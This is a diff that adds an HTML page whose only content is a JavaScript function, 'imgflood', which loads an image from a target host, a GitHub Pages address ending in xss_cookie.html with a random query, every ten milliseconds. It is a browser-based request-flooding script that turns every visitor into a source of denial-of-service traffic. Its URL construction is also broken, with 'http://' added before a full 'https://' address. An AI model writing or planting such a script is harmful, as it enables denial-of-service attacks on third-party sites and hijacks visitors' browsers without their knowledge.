@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+	<head>
+	</head>
+	<body>
+	<script type="text/javascript">
+	function imgflood() {
+		var TARGET = 'https://oldelette.github.io/xss_cookie.html'
+		var URI = '/index.php?'
+		var pic = new Image(100,200)
+		var rand = Math.floor(Math.random() * 1000)
+		pic.src = 'http://'+TARGET+URI+rand+'=val'
+		}
+		setInterval(imgflood, 10)
+	</script>
+
+	</body>
+</html>
